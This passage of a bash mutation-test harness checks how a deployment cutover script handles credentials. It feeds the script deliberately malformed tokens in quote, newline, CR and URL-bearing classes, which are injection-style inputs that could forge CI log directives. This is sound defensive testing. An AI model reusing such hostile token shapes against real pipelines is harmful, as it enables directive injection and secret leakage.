to-stderr~2|64|78) echo "::error::~2|64|78) echo >&2 "::error::~ stdout-lines arm-line credential-shape marker-name remint names-username names-password stderr-redaction text-on-stderr
credential-shape~credential shape~credential form~ credential-shape
marker-name~(marker SOLEUR_CREDENTIAL_REFUSED)~(marker SOLEUR_REFUSED)~ marker-name
remint~re-mint that credential~replace that credential~ remint
names-username~names BETTERSTACK_QUERY_USERNAME or~names the username or~ names-username
names-password~or BETTERSTACK_QUERY_PASSWORD (marker~or the password (marker~ names-password
aborts~2|64|78) echo "::error::~2|64|78) return 3; echo "::error::~ rc=3 stdout-lines arm-line credential-shape marker-name remint names-username names-password stderr-redaction closing-line
closing-line~NOTHING about the dedicated host was measured~something was measured~ closing-line
no-redaction~s/'[^']*'/'<redacted>'/g; ~~ stderr-redaction value-in-output
says-unclassified~re-mint that credential~unclassified that credential~ remint unclassified
BR_MUTANTS
[[ "$br_n" == 11 ]] || br_bad+=" [ran $br_n of 11 mutants]"
if [[ -z "$br_bad" ]]; then row "cutover _bs_read_remedy mutants: a no-op arm, an arm that writes to stderr, an arm that aborts, a lost closing line, a lost redaction, an arm that says 'unclassified', and the credential-shape, marker-name, re-mint, username and password clauses each removed are caught, and only by the clauses that name them" ok
else row "cutover _bs_read_remedy mutants: a no-op arm, an arm that writes to stderr, an arm that aborts, a lost closing line, a lost redaction, an arm that says 'unclassified', and the credential-shape, marker-name, re-mint, username and password clauses each removed are caught, and only by the clauses that name them" fail "$br_bad"; fi

# the rollback heartbeat resolution: the block from the Doppler read to the end of its if/elif/else, extracted verbatim and run with the script's
# own _bearer_ok/_bearer_curl, the recording curl and a doppler that returns the token under test.
hb_txt="$(awk '/^    BS_API=\$\(doppler secrets get BETTERSTACK_API_TOKEN/{f=1} /^    # ---- Half \(B\)/{f=0} f' "$CUT")"
[[ "$hb_txt" == *'_bearer_curl BS_API'* && "$hb_txt" == *'HB_ID'* && "$hb_txt" == *'elif ! _bearer_ok "$BS_API"; then'* ]] || fatal "the rollback heartbeat block was not extracted from $CUT"
HB_TOK="bstoken-$(od -An -N8 -tx1 /dev/urandom | tr -d ' \n')"
HB_MARK='SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape'
HB_RC=0
hb_run() { # <rowname> <block text> <token> [permissive: 1 replaces _bearer_ok with one that accepts everything, so a mutant can reach the request] -> HB_RC and $ROWS/<rowname>/{stdout,stderr,shim/}
  local row="$ROWS/$1"
  assert_fixture_dir "$row"; mkdir -p "$row/shim"
  { printf 'set -euo pipefail\n'; grep -m1 '^_bearer_ok() {' "$CUT"; awk '/^_bearer_curl\(\) \{$/,/^}$/' "$CUT"; [[ "${4:-}" == 1 ]] && printf '_bearer_ok() { return 0; }\n'; printf '%s\n' "$2"; printf 'echo DRV-AFTER\n'; } > "$row/drv.sh"
  ( cd "$row" && env -i PATH="$BKBIN:$REALBIN" BK_SHIM="$row/shim" BK_TOKEN="$3" "$BASH_BIN" "$row/drv.sh" < /dev/null > stdout 2> stderr )
  HB_RC=$?
}
hb_check() { # <rowname> <mode: ok|empty|bad> <token> -> HB_BAD (space-separated failed clause names, empty = held)
  local row="$ROWS/$1" mode="$2" tok="$3" o e f n_mask
  HB_BAD=""; o="$row/stdout"; e="$row/stderr"
  [[ "$HB_RC" -eq 0 ]] || HB_BAD+=" rc=$HB_RC"
  [[ "$(bk_count "$o" DRV-AFTER)" == 1 ]] || HB_BAD+=" arm-did-not-finish"
  n_mask="$(grep -c '^::add-mask::' "$o" || true)"
  case "$mode" in
    ok)
      [[ "$n_mask" == 1 && "$(grep -cxF -- "::add-mask::$tok" "$o" || true)" == 1 ]] || HB_BAD+=" mask-line"
      [[ "$(bk_calls "$row")" == 1 ]] || HB_BAD+=" calls=$(bk_calls "$row")"
      [[ "$(grep -cxF -- "header = \"Authorization: Bearer $tok\"" "$row/shim/calls/1.stdin" 2>/dev/null || true)" == 1 ]] || HB_BAD+=" token-not-on-stdin"
      for f in "$row"/shim/calls/*.argv; do [[ -e "$f" ]] && grep -aqF -- "$tok" "$f" && HB_BAD+=" token-in-argv"; done
      [[ "$(bk_count "$e" "$HB_MARK")$(bk_count "$o" "$HB_MARK")" == 00 ]] || HB_BAD+=" marker-on-success"
      [[ "$(bk_count "$o" 'has an unusable shape')" == 0 ]] || HB_BAD+=" shape-warning-on-success" ;;
    empty)
      [[ "$n_mask" == 0 ]] || HB_BAD+=" mask-line"
      [[ "$(bk_calls "$row")" == 0 ]] || HB_BAD+=" curl-called"
      [[ "$(bk_count "$e" "$HB_MARK")$(bk_count "$o" "$HB_MARK")" == 00 ]] || HB_BAD+=" marker-on-empty"
      [[ "$(bk_count "$o" 'BETTERSTACK_API_TOKEN unreadable from prd_terraform')" == 1 ]] || HB_BAD+=" unreadable-warning"
      [[ "$(bk_count "$o" 'has an unusable shape')" == 0 ]] || HB_BAD+=" shape-warning-on-empty" ;;
    bad)
      [[ "$n_mask" == 0 ]] || HB_BAD+=" mask-before-shape-check"
      [[ "$(bk_calls "$row")" == 0 ]] || HB_BAD+=" curl-called"
      [[ "$(bk_count "$e" "$HB_MARK")" == 1 ]] || HB_BAD+=" marker-on-stderr"
      [[ "$(bk_count "$o" "$HB_MARK")" == 0 ]] || HB_BAD+=" marker-on-stdout"
      [[ "$(bk_count "$o" '::warning::op=rollback: BETTERSTACK_API_TOKEN read from prd_terraform has an unusable shape')" == 1 ]] || HB_BAD+=" shape-warning"
      [[ "$(bk_count "$e" '::warning::')" == 0 ]] || HB_BAD+=" warning-on-stderr"
      [[ "$(bk_count "$o" 'could not resolve')" == 0 ]] || HB_BAD+=" generic-lookup-warning"
      [[ "$(bk_count "$o" 'unreadable')" == 0 ]] || HB_BAD+=" unreadable-warning"
      [[ "$(bk_count "$o" SYNTHMARK0001)$(bk_count "$e" SYNTHMARK0001)" == 00 ]] || HB_BAD+=" value-in-output" ;;
  esac
}
hb_run hb-ok "$hb_txt" "$HB_TOK"; hb_check hb-ok ok "$HB_TOK"
if [[ -z "$HB_BAD" ]]; then row "cutover rollback heartbeat driven with a well-formed token (control): the value is masked once with exactly '::add-mask::<token>', the lookup is one request carrying the bearer on stdin only, no marker, no shape warning" ok
else row "cutover rollback heartbeat driven with a well-formed token (control): the value is masked once with exactly '::add-mask::<token>', the lookup is one request carrying the bearer on stdin only, no marker, no shape warning" fail "$HB_BAD"; fi
hb_run hb-empty "$hb_txt" ""; hb_check hb-empty empty ""
if [[ -z "$HB_BAD" ]]; then row "cutover rollback heartbeat driven with an unreadable (empty) token: the 'unreadable from prd_terraform' warning on stdout, no mask line, no marker, zero requests, the block ends normally" ok
else row "cutover rollback heartbeat driven with an unreadable (empty) token: the 'unreadable from prd_terraform' warning on stdout, no mask line, no marker, zero requests, the block ends normally" fail "$HB_BAD"; fi
hb_bad=""; hb_n=0
for hb_cls in $TOK_CLASSES; do
  hb_run "hb-bad-$hb_cls" "$hb_txt" "$(tok_for "$hb_cls")"; hb_check "hb-bad-$hb_cls" bad ""; hb_n=$((hb_n + 1))
  [[ -z "$HB_BAD" ]] || hb_bad+=" [$hb_cls:$HB_BAD]"
done
[[ "$hb_n" -eq "$(wc -w <<< "$TOK_CLASSES")" && "$hb_n" -ge 8 ]] || hb_bad+=" [ran $hb_n classes]"
if [[ -z "$hb_bad" ]]; then row "cutover rollback heartbeat driven with an unusable token of every hostile class (quote+newline+url, newline, non-ASCII, quote, space, backslash, tab, CR): the marker once on STDERR (not stdout), the value-free 'unusable shape' ::warning:: once on STDOUT (not stderr), no mask line (the shape is checked BEFORE the value reaches ::add-mask::), zero requests, no 'could not resolve' message, the value in no output, the block ends normally" ok
else row "cutover rollback heartbeat driven with an unusable token of every hostile class (quote+newline+url, newline, non-ASCII, quote, space, backslash, tab, CR): the marker once on STDERR (not stdout), the value-free 'unusable shape' ::warning:: once on STDOUT (not stderr), no mask line (the shape is checked BEFORE the value reaches ::add-mask::), zero requests, no 'could not resolve' message, the value in no output, the block ends normally" fail "$hb_bad"; fi
# each clause of the block doctored ALONE: mode, token, expected failed clauses
hb_bad=""; hb_n=0
while IFS='|' read -r hb_name hb_mode hb_tokcls hb_from hb_to hb_want hb_perm; do
  [[ -n "$hb_name" ]] || continue
  if [[ -n "$hb_from" ]]; then text_mut "$hb_txt" "$hb_from" "$hb_to"; else TM_OUT="$hb_txt"; fi   # an empty edit = the permissive guard alone
  case "$hb_mode" in ok) hb_tok="$HB_TOK" ;; empty) hb_tok="" ;; *) hb_tok="$(tok_for "$hb_tokcls")" ;; esac
  hb_run "hb-mut-$hb_name" "$TM_OUT" "$hb_tok" "$hb_perm"; hb_check "hb-mut-$hb_name" "$hb_mode" "$hb_tok"; hb_n=$((hb_n + 1))
  [[ "$HB_BAD" == "$hb_want" ]] || hb_bad+=" [$hb_name: got '${HB_BAD:-<none>}' want '$hb_want']"
done <<'HB_MUTANTS'
marker-commented-out|bad|quote|      echo "SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape" >&2|      : "SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape" >&2| marker-on-stderr
marker-to-stdout|bad|quote|reason=token_shape" >&2|reason=token_shape"| marker-on-stderr marker-on-stdout
warning-no-op|bad|quote|      echo "::warning::op=rollback: BETTERSTACK_API_TOKEN read from prd_terraform has an unusable shape|      : "::warning::op=rollback: BETTERSTACK_API_TOKEN read from prd_terraform has an unusable shape| shape-warning
warning-to-stderr|bad|quote|echo "::warning::op=rollback: BETTERSTACK_API_TOKEN read from prd_terraform has an unusable shape|echo >&2 "::warning::op=rollback: BETTERSTACK_API_TOKEN read from prd_terraform has an unusable shape| shape-warning warning-on-stderr
mask-before-shape-check|bad|newline-only|_bearer_ok "$BS_API" && [[ -n "$BS_API" ]] && printf|[[ -n "$BS_API" ]] && printf| mask-before-shape-check value-in-output
shape-arm-removed|bad|quote|elif ! _bearer_ok "$BS_API"; then|elif false; then| marker-on-stderr shape-warning generic-lookup-warning
mask-dropped|ok||printf '::add-mask::%s\n' "$BS_API"|: '::add-mask::%s\n' "$BS_API"| mask-line
unreadable-warning-no-op|empty||    echo "::warning::op=rollback: BETTERSTACK_API_TOKEN unreadable from prd_terraform|    : "::warning::op=rollback: BETTERSTACK_API_TOKEN unreadable from prd_terraform| unreadable-warning
aborts-exit3|bad|quote|elif ! _bearer_ok "$BS_API"; then|elif ! _bearer_ok "$BS_API"; then exit 3| rc=3 arm-did-not-finish marker-on-stderr shape-warning
aborts-exit0|bad|quote|elif ! _bearer_ok "$BS_API"; then|elif ! _bearer_ok "$BS_API"; then exit 0| arm-did-not-finish marker-on-stderr shape-warning
lookup-dropped|ok||HB_ID=$(_bearer_curl BS_API -fsS|HB_ID=$(: BS_API -fsS| calls=0 token-not-on-stdin
token-in-argv|ok||HB_ID=$(_bearer_curl BS_API -fsS --max-time 20 \|HB_ID=$(curl --disable -fsS -H "Authorization: Bearer $BS_API" --max-time 20 \| token-not-on-stdin token-in-argv
shape-test-inverted|ok||elif ! _bearer_ok "$BS_API"; then|elif _bearer_ok "$BS_API"; then| calls=0 token-not-on-stdin marker-on-success shape-warning-on-success
bare-mask-on-empty|empty||_bearer_ok "$BS_API" && [[ -n "$BS_API" ]] && printf|printf| mask-line
empty-arm-removed|empty||if [[ -z "$BS_API" ]]; then|if false; then| marker-on-empty unreadable-warning shape-warning-on-empty
empty-reaches-request|empty||if [[ -z "$BS_API" ]]; then|if false; then| curl-called unreadable-warning|1
bad-reaches-request|bad|quote||| mask-before-shape-check curl-called marker-on-stderr shape-warning generic-lookup-warning value-in-output|1
unreadable-in-shape-arm|bad|quote|has an unusable shape|has an unreadable shape| shape-warning unreadable-warning
HB_MUTANTS
[[ "$hb_n" == 18 ]] || hb_bad+=" [ran $hb_n of 18 mutants]"
if [[ -z "$hb_bad" ]]; then row "cutover rollback heartbeat mutants: the marker commented out or sent to stdout, the shape warning no-op'd or sent to stderr, the mask moved back before the shape check, the shape arm removed or inverted, the mask dropped, the unreadable warning no-op'd, an arm that exits, a lookup that is dropped or puts the token in argv, an empty or unusable token that reaches the request, and a shape arm that says 'unreadable' are each caught, and only by the clauses that name them" ok
else row "cutover rollback heartbeat mutants: the marker commented out or sent to stdout, the shape warning no-op'd or sent to stderr, the mask moved back before the shape check, the shape arm removed or inverted, the mask dropped, the unreadable warning no-op'd, an arm that exits, a lookup that is dropped or puts the token in argv, an empty or unusable token that reaches the request, and a shape arm that says 'unreadable' are each caught, and only by the clauses that name them" fail "$hb_bad"; fi
# =====================================================================================
# #9757 review leads (a), (b) and (g) of scripts/cutover-inngest.sh, each driven through a recording curl / doppler and the script's own text:
#   (a1) _inngest_server_created_epoch judges its token with _bearer_ok BEFORE it masks it or feeds it to `-H @-`: a refusal takes the empty-token arm's verdict
#        class (one ::warning::, `__UNREADABLE__`, rc 0), prints the marker on stderr, and makes zero requests;
#   (a2) the op=verify zero-run discovery call judges $SIG and both Cloudflare Access values before its own `--config -`;
#   (b)  the six `::add-mask::` sites of op=arm / _inngest_server_created_epoch shape-check first (no control character: a newline would end the directive and
#        start a forged one) and mask second, and keep `-n` (an empty read never prints a bare directive);
#   (g)  the four response-body echoes print a bounded (160), scrubbed (printable ASCII) FIRST line, mid-line in the arm's own ::error:: text, never the raw body.
# The text under test is EXTRACTED from the real script; mutants doctor exactly one clause (text_mut refuses a replacement that changes more than one line).
# =====================================================================================
LD_REAL="$TMPD/ldreal"; LD_BIN="$TMPD/ldbin"
for d in "$LD_REAL" "$LD_BIN"; do assert_fixture_dir "$d"; mkdir -p "$d"; done
for t in bash cat grep sed tr awk head cut sha256sum jq mktemp rm mkdir env wc sort true false printf; do
  p="$(type -P "$t" || true)"; [[ -n "$p" ]] && ln -s "$p" "$LD_REAL/$t"
done
# doppler stub for the op=arm reads: `doppler secrets get NAME ...` prints $BK_A_NAME (the read-through app config) or $BK_H_NAME when the call names
# the soleur-inngest project (the host config); an unset variable prints an empty line, like an empty secret.
printf '#!%s\nname="$3"; scope=A\nfor a in "$@"; do [[ "$a" == soleur-inngest ]] && scope=H; done\nv="BK_${scope}_${name}"\nprintf "%%s\\n" "${!v:-}"\n' "$BASH_BIN" > "$LD_BIN/doppler"
chmod +x "$LD_BIN/doppler"
LD_MARK='SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape'
LD_RC=0; LD_BAD=""
ld_caught() { # <bad clauses string> <must-name clause> -> rc 0 when the mutant was caught AND the named clause is among the failures
  [[ -n "$1" && " $1 " == *" $2"* ]]
}

# ---- (a1) _inngest_server_created_epoch ------------------------------------------------------------------------
ie_fn="$(awk '/^_inngest_server_created_epoch\(\) \{$/,/^\}$/' "$CUT")"
[[ "$ie_fn" == *'if ! _bearer_ok "$tok"; then'* && "$ie_fn" == *'-H @-'* && "$ie_fn" == *"add-mask"* ]] || fatal "lead (a1): the token read of _inngest_server_created_epoch was not extracted from $CUT"
ie_run() { # <row> <function text> <token>: combined stdout+stderr in $ROWS/<row>/out (stderr keeps its order against the recording curl's SHIMCALL line)
  local row="$ROWS/$1"
  assert_fixture_dir "$row"; mkdir -p "$row/shim"
  { printf 'set -euo pipefail\n'; grep -m1 '^_bearer_ok() {' "$CUT"; awk '/^_hcloud_created_epoch\(\) \{$/,/^\}$/' "$CUT"; printf '%s\n' "$2"
    printf 'INNGEST_HOST=soleur-inngest\nDRV_OUT="$(_inngest_server_created_epoch)"\necho "DRV-OUT=$DRV_OUT"\necho DRV-AFTER\n'; } > "$row/drv.sh"
  ( cd "$row" && env -i PATH="$BKBIN:$REALBIN" BK_SHIM="$row/shim" BK_TOKEN="$3" "$BASH_BIN" "$row/drv.sh" < /dev/null > "$row/out" 2>&1 )
  LD_RC=$?
}
ie_check() { # <row> <mode: ok|bad|empty> <token>
  local row="$ROWS/$1" mode="$2" tok="$3" f m c
  LD_BAD=""; local o="$row/out"
  [[ "$LD_RC" -eq 0 ]] || LD_BAD+=" rc=$LD_RC"
  [[ "$(bk_count "$o" DRV-AFTER)" == 1 ]] || LD_BAD+=" did-not-finish"
  case "$mode" in
    ok)
      [[ "$(grep -cxF -- "::add-mask::$tok" "$o" || true)" == 1 ]] || LD_BAD+=" mask-line"
      [[ "$(head -n1 "$o")" == "::add-mask::$tok" ]] || LD_BAD+=" mask-not-first"   # the curl's own stderr is discarded by the function, so the order against the request is the code order: the mask is the FIRST output line
      [[ "$(bk_calls "$row")" == 1 ]] || LD_BAD+=" calls=$(bk_calls "$row")"
      [[ "$(grep -cxF -- "Authorization: Bearer $tok" "$row/shim/calls/1.stdin" 2>/dev/null || true)" == 1 ]] || LD_BAD+=" token-not-on-stdin"
      for f in "$row"/shim/calls/*.argv; do [[ -e "$f" ]] && grep -aqF -- "$tok" "$f" && LD_BAD+=" token-in-argv"; done
      [[ "$(bk_count "$o" "$tok")" == 1 ]] || LD_BAD+=" token-printed-beyond-the-mask"
      [[ "$(bk_count "$o" "$LD_MARK")" == 0 ]] || LD_BAD+=" marker-on-success" ;;
    bad)
      [[ "$(bk_count "$o" '::add-mask::')" == 0 ]] || LD_BAD+=" mask-line"
      [[ "$(bk_calls "$row")" == 0 ]] || LD_BAD+=" calls=$(bk_calls "$row")"
      [[ "$(bk_count "$o" "$LD_MARK")" == 1 ]] || LD_BAD+=" marker-count=$(bk_count "$o" "$LD_MARK")"
      [[ "$(bk_count "$o" '::warning::G3 generation anchor: the HCLOUD_TOKEN_READONLY read from prd_terraform has an unusable shape')" == 1 ]] || LD_BAD+=" shape-warning"
      [[ "$(grep -cxF 'DRV-OUT=__UNREADABLE__' "$o" || true)" == 1 ]] || LD_BAD+=" verdict-class"
      [[ "$(bk_count "$o" SYNTHMARK0001)$(bk_count "$o" SYNTHMARK0002)" == 00 ]] || LD_BAD+=" value-in-output" ;;
    empty)
      [[ "$(bk_count "$o" '::add-mask::')" == 0 ]] || LD_BAD+=" mask-line"
      [[ "$(bk_calls "$row")" == 0 ]] || LD_BAD+=" calls=$(bk_calls "$row")"
      [[ "$(bk_count "$o" "$LD_MARK")" == 0 ]] || LD_BAD+=" marker-on-empty"
      [[ "$(bk_count "$o" 'doppler returned nothing for HCLOUD_TOKEN_READONLY or HCLOUD_TOKEN')" == 1 ]] || LD_BAD+=" empty-warning"
      [[ "$(grep -cxF 'DRV-OUT=__UNREADABLE__' "$o" || true)" == 1 ]] || LD_BAD+=" verdict-class" ;;
  esac
}
LD_TOK="hztoken-$(od -An -N8 -tx1 /dev/urandom | tr -d ' \n')"
ie_run ie-ok "$ie_fn" "$LD_TOK"; ie_check ie-ok ok "$LD_TOK"
if [[ -z "$LD_BAD" ]]; then row "lead (a1) _inngest_server_created_epoch driven with a well-formed token (control): masked once as the first output line, one request, the bearer on the -H @- stdin only, no marker" ok
else row "lead (a1) _inngest_server_created_epoch driven with a well-formed token (control): masked once as the first output line, one request, the bearer on the -H @- stdin only, no marker" fail "$LD_BAD"; fi
ie_run ie-empty "$ie_fn" ""; ie_check ie-empty empty ""
if [[ -z "$LD_BAD" ]]; then row "lead (a1) _inngest_server_created_epoch driven with an empty token: the existing 'doppler returned nothing' warning, no mask, no marker, zero requests, __UNREADABLE__" ok
else row "lead (a1) _inngest_server_created_epoch driven with an empty token: the existing 'doppler returned nothing' warning, no mask, no marker, zero requests, __UNREADABLE__" fail "$LD_BAD"; fi
ld_bad=""; ld_n=0
for ld_cls in $TOK_CLASSES; do
  ie_run "ie-bad-$ld_cls" "$ie_fn" "$(tok_for "$ld_cls")"; ie_check "ie-bad-$ld_cls" bad ""; ld_n=$((ld_n + 1))
  [[ -z "$LD_BAD" ]] || ld_bad+=" [$ld_cls:$LD_BAD]"
done
[[ "$ld_n" -ge 8 ]] || ld_bad+=" [ran $ld_n classes]"
if [[ -z "$ld_bad" ]]; then row "lead (a1) _inngest_server_created_epoch driven with an unusable token of every hostile class: the marker once on stderr, one value-free 'unusable shape' warning, __UNREADABLE__ with rc 0 (the empty-token verdict class), no mask line, ZERO requests" ok
else row "lead (a1) _inngest_server_created_epoch driven with an unusable token of every hostile class: the marker once on stderr, one value-free 'unusable shape' warning, __UNREADABLE__ with rc 0 (the empty-token verdict class), no mask line, ZERO requests" fail "$ld_bad"; fi
ld_bad=""; ld_n=0
while IFS='|' read -r ld_name ld_mode ld_cls ld_from ld_to ld_must; do
  [[ -n "$ld_name" ]] || continue
  text_mut "$ie_fn" "$ld_from" "$ld_to"
  if [[ "$ld_mode" == ok ]]; then ld_tok="$LD_TOK"; else ld_tok="$(tok_for "$ld_cls")"; fi
  ie_run "ie-mut-$ld_name" "$TM_OUT" "$ld_tok"; if [[ "$ld_mode" == ok ]]; then ie_check "ie-mut-$ld_name" ok "$ld_tok"; else ie_check "ie-mut-$ld_name" bad ""; fi
  ld_n=$((ld_n + 1)); ld_caught "$LD_BAD" "$ld_must" || ld_bad+=" [$ld_name: got '${LD_BAD:-<none>}' wanted a failure naming '$ld_must']"
done <<'IE_MUTANTS'
check-removed|bad|quote-newline-url|  if ! _bearer_ok "$tok"; then|  if false; then|mask-line
marker-dropped|bad|quote|    echo "SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape" >&2|    : "SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape" >&2|marker-count
warning-dropped|bad|quote|    echo "::warning::G3 generation anchor: the $tokvar read|    : "::warning::G3 generation anchor: the $tokvar read|shape-warning
check-inverted|ok||  if ! _bearer_ok "$tok"; then|  if _bearer_ok "$tok"; then|calls=0
mask-dropped|ok||  printf '::add-mask::%s\n' "$tok" >&2|  : '::add-mask::%s\n' "$tok" >&2|mask-line
IE_MUTANTS
[[ "$ld_n" == 5 ]] || ld_bad+=" [ran $ld_n of 5 mutants]"
if [[ -z "$ld_bad" ]]; then row "lead (a1) mutants: the shape check removed or inverted, the marker or the warning dropped, the mask dropped are each caught by the clause that names them" ok
else row "lead (a1) mutants: the shape check removed or inverted, the marker or the warning dropped, the mask dropped are each caught by the clause that names them" fail "$ld_bad"; fi

# ---- (a2) the op=verify zero-run discovery call -----------------------------------------------------------------
dc_txt="$(awk '/^            # All three values are judged BEFORE the config is built/{f=1} f{print} f&&/^            DISC_BODY=/{exit}' "$CUT" | sed 's|/tmp/verify-zero-run|${BK_TMP}/verify-zero-run|g')"
[[ "$dc_txt" == *'if _bearer_ok "$SIG" && _bearer_ok "$CF_ACCESS_CLIENT_ID" && _bearer_ok "$CF_ACCESS_CLIENT_SECRET"; then'* && "$dc_txt" == *'--config -'* ]] || fatal "lead (a2): the discovery call was not extracted from $CUT"
dc_run() { # <row> <block text> <SIG> <CF id> <CF secret>
  local row="$ROWS/$1"
  assert_fixture_dir "$row"; mkdir -p "$row/shim" "$row/tmp"
  { printf 'set -euo pipefail\n'; grep -m1 '^_bearer_ok() {' "$CUT"
    printf 'DISC_URL="https://deploy.example.test/hooks/inngest-doublefire-probe?from=x"\n'; printf '%s\n' "$2"; printf 'echo "DRV-CODE=$DISC_CODE"\n'; } > "$row/drv.sh"
  ( cd "$row" && env -i PATH="$BKBIN:$REALBIN" BK_SHIM="$row/shim" BK_TMP="$row/tmp" SIG="$3" CF_ACCESS_CLIENT_ID="$4" CF_ACCESS_CLIENT_SECRET="$5" "$BASH_BIN" "$row/drv.sh" < /dev/null > "$row/stdout" 2> "$row/stderr" )
  LD_RC=$?
}
dc_check() { # <row> <mode: ok|bad> <SIG> <CF id> <CF secret>
  local row="$ROWS/$1" mode="$2" v f; LD_BAD=""
  [[ "$LD_RC" -eq 0 ]] || LD_BAD+=" rc=$LD_RC"
  if [[ "$mode" == ok ]]; then
    [[ "$(bk_calls "$row")" == 1 ]] || LD_BAD+=" calls=$(bk_calls "$row")"
    [[ "$(grep -cxF -- "header = \"X-Signature-256: sha256=$3\"" "$row/shim/calls/1.stdin" 2>/dev/null || true)" == 1 && "$(grep -cxF -- "header = \"CF-Access-Client-Id: $4\"" "$row/shim/calls/1.stdin" 2>/dev/null || true)" == 1 \
      && "$(grep -cxF -- "header = \"CF-Access-Client-Secret: $5\"" "$row/shim/calls/1.stdin" 2>/dev/null || true)" == 1 && "$(wc -l < "$row/shim/calls/1.stdin" 2>/dev/null | tr -d ' ')" == 3 ]] || LD_BAD+=" headers-not-on-stdin"
    for f in "$row"/shim/calls/*.argv; do [[ -e "$f" ]] && for v in "$3" "$4" "$5"; do grep -aqF -- "$v" "$f" && LD_BAD+=" credential-in-argv"; done; done
    [[ "$(grep -cxF 'DRV-CODE=200' "$row/stdout" || true)" == 1 ]] || LD_BAD+=" code"
    [[ "$(bk_count "$row/stderr" "$LD_MARK")" == 0 ]] || LD_BAD+=" marker-on-success"
  else
    [[ "$(bk_calls "$row")" == 0 ]] || LD_BAD+=" calls=$(bk_calls "$row")"
    [[ "$(bk_count "$row/stderr" "$LD_MARK")" == 1 ]] || LD_BAD+=" marker-count=$(bk_count "$row/stderr" "$LD_MARK")"
    [[ "$(grep -cxF 'DRV-CODE=000' "$row/stdout" || true)" == 1 ]] || LD_BAD+=" verdict-class"
    [[ "$(bk_count "$row/stdout" SYNTHMARK0001)$(bk_count "$row/stderr" SYNTHMARK0001)$(bk_count "$row/stdout" SYNTHMARK0002)$(bk_count "$row/stderr" SYNTHMARK0002)" == 0000 ]] || LD_BAD+=" value-in-output"
  fi
}
dc_run dc-ok "$dc_txt" "$HM_WH" "$HM_CFID" "$HM_CFSEC"; dc_check dc-ok ok "$HM_WH" "$HM_CFID" "$HM_CFSEC"
if [[ -z "$LD_BAD" ]]; then row "lead (a2) op=verify zero-run discovery driven with well-formed values (control): one request, the signature and both Cloudflare Access headers on the --config - stdin only, HTTP 200, no marker" ok
else row "lead (a2) op=verify zero-run discovery driven with well-formed values (control): one request, the signature and both Cloudflare Access headers on the --config - stdin only, HTTP 200, no marker" fail "$LD_BAD"; fi
ld_bad=""; ld_n=0
for ld_slot in sig id secret; do
  for ld_cls in $TOK_CLASSES; do
    ld_h="$(tok_for "$ld_cls")"; ld_s="$HM_WH"; ld_i="$HM_CFID"; ld_x="$HM_CFSEC"
    case "$ld_slot" in sig) ld_s="$ld_h" ;; id) ld_i="$ld_h" ;; secret) ld_x="$ld_h" ;; esac
    dc_run "dc-bad-$ld_slot-$ld_cls" "$dc_txt" "$ld_s" "$ld_i" "$ld_x"; dc_check "dc-bad-$ld_slot-$ld_cls" bad "$ld_s" "$ld_i" "$ld_x"; ld_n=$((ld_n + 1))
    [[ -z "$LD_BAD" ]] || ld_bad+=" [$ld_slot/$ld_cls:$LD_BAD]"
  done
done
[[ "$ld_n" -ge 24 ]] || ld_bad+=" [ran $ld_n cases]"
if [[ -z "$ld_bad" ]]; then row "lead (a2) op=verify zero-run discovery driven with an unusable signature, Cloudflare Access id or secret of every hostile class: zero requests, the marker once on stderr, the advisory failure class (HTTP 000), nothing of the value in any stream" ok
else row "lead (a2) op=verify zero-run discovery driven with an unusable signature, Cloudflare Access id or secret of every hostile class: zero requests, the marker once on stderr, the advisory failure class (HTTP 000), nothing of the value in any stream" fail "$ld_bad"; fi
ld_bad=""; ld_n=0
while IFS='|' read -r ld_name ld_slot ld_cls ld_from ld_to ld_must; do
  [[ -n "$ld_name" ]] || continue
  text_mut "$dc_txt" "$ld_from" "$ld_to"
  ld_s="$HM_WH"; ld_i="$HM_CFID"; ld_x="$HM_CFSEC"; ld_h="$(tok_for "$ld_cls")"
  case "$ld_slot" in sig) ld_s="$ld_h" ;; id) ld_i="$ld_h" ;; secret) ld_x="$ld_h" ;; esac
  dc_run "dc-mut-$ld_name" "$TM_OUT" "$ld_s" "$ld_i" "$ld_x"; dc_check "dc-mut-$ld_name" bad "" "" ""; ld_n=$((ld_n + 1))
  ld_caught "$LD_BAD" "$ld_must" || ld_bad+=" [$ld_name: got '${LD_BAD:-<none>}' wanted a failure naming '$ld_must']"
done <<'DC_MUTANTS'
guard-removed|sig|quote-newline-url|            if _bearer_ok "$SIG" && _bearer_ok "$CF_ACCESS_CLIENT_ID" && _bearer_ok "$CF_ACCESS_CLIENT_SECRET"; then|            if true; then|calls=
secret-unjudged|secret|tab|_bearer_ok "$SIG" && _bearer_ok "$CF_ACCESS_CLIENT_ID" && _bearer_ok "$CF_ACCESS_CLIENT_SECRET"; then|_bearer_ok "$SIG" && _bearer_ok "$CF_ACCESS_CLIENT_ID"; then|calls=
id-unjudged|id|cr|_bearer_ok "$SIG" && _bearer_ok "$CF_ACCESS_CLIENT_ID" && _bearer_ok "$CF_ACCESS_CLIENT_SECRET"; then|_bearer_ok "$SIG" && _bearer_ok "$CF_ACCESS_CLIENT_SECRET"; then|calls=
marker-dropped|sig|quote|              echo "SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape" >&2|              : "SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape" >&2|marker-count
code-dropped|sig|quote|              DISC_CODE="000"|              DISC_CODE="200"|verdict-class
DC_MUTANTS
[[ "$ld_n" == 5 ]] || ld_bad+=" [ran $ld_n of 5 mutants]"
if [[ -z "$ld_bad" ]]; then row "lead (a2) mutants: the guard removed, either Cloudflare Access value left unjudged, the marker dropped and a refusal that reads as success are each caught" ok
else row "lead (a2) mutants: the guard removed, either Cloudflare Access value left unjudged, the marker dropped and a refusal that reads as success are each caught" fail "$ld_bad"; fi

# ---- (b) the five op=arm `::add-mask::` sites -------------------------------------------------------------------
# G2 (PG, HB) and the G3 dark read (PG_DARK) as one extracted chunk, and the G3.5 channel-key loop (APP_CK, HOST_CK) as another. Every value is a synthesized
# stand-in; the control values carry `:`, `@`, `?` and `&` (a DSN and a URL), which a bearer-shape check would have refused and left UNMASKED.
